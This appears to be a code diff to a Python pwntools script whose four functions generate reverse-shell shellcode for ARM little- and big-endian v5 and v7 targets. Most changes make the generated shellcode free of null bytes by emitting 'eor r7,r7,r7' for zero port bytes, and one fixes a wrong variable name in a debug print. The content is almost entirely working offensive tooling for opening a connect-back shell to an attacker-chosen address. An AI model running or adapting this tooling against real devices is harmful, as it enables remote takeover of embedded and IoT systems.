@@ -49,9 +49,9 @@ def generate_armelv7_shellcode(reverse_ip,reverse_port):
 	mov r7,#2
 	strb r7,[sp,#-0x2c]
 	strb r4,[sp,#-0x2b]
-	mov r7,#%s
+	%s
 	strb r7,[sp,#-0x2a]
-	mov r7,#%s
+	%s
 	strb r7,[sp,#-0x29]
 	strb r4,[sp,#-0x14]
 	mov r7,#0x68
@@ -104,13 +104,20 @@ def generate_armelv7_shellcode(reverse_ip,reverse_port):
 	svc #1
 	'''
 	handle_ip=reverse_ip.split('.')
-	handle_port=p16(reverse_port)[::-1]
+	handle_port=list(p16(reverse_port)[::-1])
 	for i in range(len(handle_ip)):
 		if handle_ip[i]!="0":
 			handle_ip[i]="mov r7,#"+handle_ip[i]
 		else:
 			handle_ip[i]="eor r7,r7,r7"
-	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],str(u8(handle_port[0])),str(u8(handle_port[1])))
+	for i in range(len(handle_port)):
+		if handle_port[i]!="\x00":
+			handle_port[i]="mov r7,#"+str(u8(handle_port[i]))
+		else:
+			handle_port[i]="eor r7,r7,r7"
+
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
+	#print shellcode
 	#str(u8(handle_port[0])),str(u8(handle_port[1])
 	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
 	shellcode=asm(shellcode)[:-2]
@@ -119,7 +126,7 @@ def generate_armelv7_shellcode(reverse_ip,reverse_port):
 	shellcode_len=len(shellcode)
 	if "\\x00" in shellcode_hex:
 		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
-		print data_shellcode.index("\x00")
+		print shellcode.index("\x00")
 		print shellcode_hex
 	else:
 		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
@@ -163,9 +170,9 @@ def generate_armelv5_shellcode(reverse_ip,reverse_port):
 	mov r7,#2
 	strb r7,[sp,#-0x2c]
 	strb r4,[sp,#-0x2b]
-	mov r7,#%s
+	%s
 	strb r7,[sp,#-0x2a]
-	mov r7,#%s
+	%s
 	strb r7,[sp,#-0x29]
 	strb r4,[sp,#-0x14]
 	mov r7,#0x68
@@ -218,13 +225,20 @@ def generate_armelv5_shellcode(reverse_ip,reverse_port):
 	svc #1
 	'''
 	handle_ip=reverse_ip.split('.')
-	handle_port=p16(reverse_port)[::-1]
+	handle_port=list(p16(reverse_port)[::-1])
 	for i in range(len(handle_ip)):
 		if handle_ip[i]!="0":
 			handle_ip[i]="mov r7,#"+handle_ip[i]
 		else:
 			handle_ip[i]="eor r7,r7,r7"
-	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],str(u8(handle_port[0])),str(u8(handle_port[1])))
+	for i in range(len(handle_port)):
+		if handle_port[i]!="\x00":
+			handle_port[i]="mov r7,#"+str(u8(handle_port[i]))
+		else:
+			handle_port[i]="eor r7,r7,r7"
+
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
+	#print shellcode
 	#str(u8(handle_port[0])),str(u8(handle_port[1])
 	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
 	shellcode=asm(shellcode)[:-2]
@@ -233,7 +247,7 @@ def generate_armelv5_shellcode(reverse_ip,reverse_port):
 	shellcode_len=len(shellcode)
 	if "\\x00" in shellcode_hex:
 		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
-		print data_shellcode.index("\x00")
+		print shellcode.index("\x00")
 		print shellcode_hex
 	else:
 		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
@@ -254,9 +268,9 @@ def generate_armebv7_shellcode(reverse_ip,reverse_port):
 	mov r7,#2
 	strb r7,[sp,#-0x2c]
 	strb r4,[sp,#-0x2b]
-	mov r7,#%s
+	%s
 	strb r7,[sp,#-0x2a]
-	mov r7,#%s
+	%s
 	strb r7,[sp,#-0x29]
 	strb r4,[sp,#-0x14]
 	mov r7,#0x68
@@ -309,13 +323,20 @@ def generate_armebv7_shellcode(reverse_ip,reverse_port):
 	svc #1
 	'''
 	handle_ip=reverse_ip.split('.')
-	handle_port=p16(reverse_port)[::-1]
+	handle_port=list(p16(reverse_port)[::-1])
 	for i in range(len(handle_ip)):
 		if handle_ip[i]!="0":
 			handle_ip[i]="mov r7,#"+handle_ip[i]
 		else:
 			handle_ip[i]="eor r7,r7,r7"
-	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],str(u8(handle_port[0])),str(u8(handle_port[1])))
+	for i in range(len(handle_port)):
+		if handle_port[i]!="\x00":
+			handle_port[i]="mov r7,#"+str(u8(handle_port[i]))
+		else:
+			handle_port[i]="eor r7,r7,r7"
+
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
+	#print shellcode
 	#str(u8(handle_port[0])),str(u8(handle_port[1])
 	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
 	shellcode=asm(shellcode)[:-2]
@@ -324,7 +345,7 @@ def generate_armebv7_shellcode(reverse_ip,reverse_port):
 	shellcode_len=len(shellcode)
 	if "\\x00" in shellcode_hex:
 		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
-		print data_shellcode.index("\x00")
+		print shellcode.index("\x00")
 		print shellcode_hex
 	else:
 		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
@@ -345,9 +366,9 @@ def generate_armebv5_shellcode(reverse_ip,reverse_port):
 	mov r7,#2
 	strb r7,[sp,#-0x2c]
 	strb r4,[sp,#-0x2b]
-	mov r7,#%s
+	%s
 	strb r7,[sp,#-0x2a]
-	mov r7,#%s
+	%s
 	strb r7,[sp,#-0x29]
 	strb r4,[sp,#-0x14]
 	mov r7,#0x68
@@ -400,13 +421,20 @@ def generate_armebv5_shellcode(reverse_ip,reverse_port):
 	svc #1
 	'''
 	handle_ip=reverse_ip.split('.')
-	handle_port=p16(reverse_port)[::-1]
+	handle_port=list(p16(reverse_port)[::-1])
 	for i in range(len(handle_ip)):
 		if handle_ip[i]!="0":
 			handle_ip[i]="mov r7,#"+handle_ip[i]
 		else:
 			handle_ip[i]="eor r7,r7,r7"
-	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],str(u8(handle_port[0])),str(u8(handle_port[1])))
+	for i in range(len(handle_port)):
+		if handle_port[i]!="\x00":
+			handle_port[i]="mov r7,#"+str(u8(handle_port[i]))
+		else:
+			handle_port[i]="eor r7,r7,r7"
+
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
+	#print shellcode
 	#str(u8(handle_port[0])),str(u8(handle_port[1])
 	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
 	shellcode=asm(shellcode)[:-2]
@@ -415,7 +443,7 @@ def generate_armebv5_shellcode(reverse_ip,reverse_port):
 	shellcode_len=len(shellcode)
 	if "\\x00" in shellcode_hex:
 		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
-		print data_shellcode.index("\x00")
+		print shellcode.index("\x00")
 		print shellcode_hex
 	else:
 		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
